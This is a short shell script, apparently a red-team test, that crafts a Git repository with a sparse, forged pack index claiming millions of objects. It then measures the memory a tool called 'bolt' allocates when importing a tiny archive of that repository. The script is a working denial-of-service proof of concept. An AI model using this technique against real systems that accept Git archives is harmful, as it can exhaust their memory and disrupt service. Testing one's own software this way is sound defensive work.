#!/bin/sh
# RT3: Git's pack index is read into memory sized by the object count its own fan-out claims,
# checked only against the file's length. A sparse .idx costs nothing on disk and survives
# `tar --sparse`, so `bolt import` of a few-KB archive allocates gigabytes before it refuses.
# Run in the sandbox from /work:  sh redteam/attacks3/sparse-idx.sh [bolt] [millions-of-objects...]
set -u
BOLT=${1:-/tmp/t/release/bolt}
shift
COUNTS=${*:-"25 100"}
export BOLT_USER_NAME=T BOLT_USER_EMAIL=t@example.com BOLT_CONFIG_DIR=/tmp/si-cfg
mkdir -p "$BOLT_CONFIG_DIR"
for m in $COUNTS; do
    d=$(mktemp -d); cd "$d" || exit 1
    python3 -I - "$m" <<'EOF'
import os, struct, sys
sys.path.insert(0, "/work/redteam/attacks3")
from gitrepo import Repo
count = int(sys.argv[1]) * 1_000_000
repo = Repo(".")
repo.ref("refs/heads/main", bytes.fromhex("11" * 20))
# A version 2 index whose fan-out says `count` objects, and exactly the length that needs:
# header and fan-out, then 20 + 4 + 4 bytes an object and two checksums, all a hole.
path = ".git/objects/pack/pack-%s" % ("ab" * 20)
with open(path + ".idx", "wb") as f:
    f.write(b"\xfftOc" + struct.pack(">I", 2) + struct.pack(">I", count) * 256)
    f.truncate(8 + 1024 + 28 * count + 40)
open(path + ".pack", "wb").write(b"PACK" + struct.pack(">II", 2, 0) + bytes(20))
EOF
    echo "objects claimed: ${m}M; .idx $(stat -c %s .git/objects/pack/*.idx) bytes apparent, $(du -sk .git | cut -f1) KB on disk"
    tar --sparse -czf /tmp/si.tgz .git && echo "  tar --sparse -czf of .git: $(stat -c %s /tmp/si.tgz) bytes"
    python3 -I /work/redteam/attacks2/measure.py 300 "$d" "$BOLT" import | sed 's/^/  /'
    cd / && rm -rf "$d" /tmp/si.tgz
done
